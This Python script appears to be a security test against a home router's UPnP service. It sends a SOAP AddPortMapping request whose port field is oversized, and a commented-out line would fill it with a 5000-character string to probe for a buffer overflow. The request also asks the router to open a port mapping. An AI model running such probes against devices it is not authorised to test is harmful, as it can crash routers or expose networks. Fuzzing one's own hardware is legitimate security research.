import requests

url = "http://192.168.1.254:49152/upnp/control/WANIPConn1"

##ports = [49152, 49153]

   ##<NewExternalPort>{"5"*5000}</NewExternalPort>       

# Monta payload XML
xml_payload = f"""<?xml version="1.0"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"
    s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
  <s:Body>
    <u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:2">
      <NewRemoteHost></NewRemoteHost>
      <NewExternalPort>{"1"*10}</NewExternalPort>
      <NewProtocol>TCP</NewProtocol>
      <NewInternalPort>555</NewInternalPort>
      <NewInternalClient>192.168.1.100</NewInternalClient>
      <NewEnabled>1</NewEnabled>
      <NewPortMappingDescription>buffer_test</NewPortMappingDescription>
      <NewLeaseDuration>1</NewLeaseDuration>
    </u:AddPortMapping>
  </s:Body>
</s:Envelope>
"""

headers = {
    "Content-Type": 'text/xml; charset="utf-8"',
    "SOAPACTION": '"urn:schemas-upnp-org:service:WANIPConnection:2#AddPortMapping"'
}

try:
    resp = requests.post(url, data=xml_payload, headers=headers, timeout=2)
    print(f"Conectado [HTTP {resp.status_code}]")
    print(resp.text)
except requests.exceptions.RequestException as e:
    print(f"[ERRO] {e}")
